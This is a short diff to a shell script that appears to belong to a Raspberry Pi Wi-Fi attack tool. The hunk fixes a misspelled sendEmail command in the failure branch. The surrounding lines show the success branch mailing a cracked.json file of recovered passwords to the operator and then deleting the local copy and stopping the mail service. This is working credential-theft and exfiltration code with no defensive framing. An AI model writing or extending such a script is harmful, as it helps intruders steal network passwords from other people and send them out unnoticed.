@@ -16,7 +16,7 @@ then
     sendEmail -f pifi@attcking.pi -t $my_address -u "Pa$$W0RD$" -a cracked.json
     rm cracked.json
 else
-    endEmail -f pifi@attcking.pi -t $my_address -u "Unsuccessful Attack" -m "Plug the pi into power supply to retry."
+    sendEmail -f pifi@attcking.pi -t $my_address -u "Unsuccessful Attack" -m "Plug the pi into power supply to retry."
 fi
 sleep 30s
 systemctl stop postfix
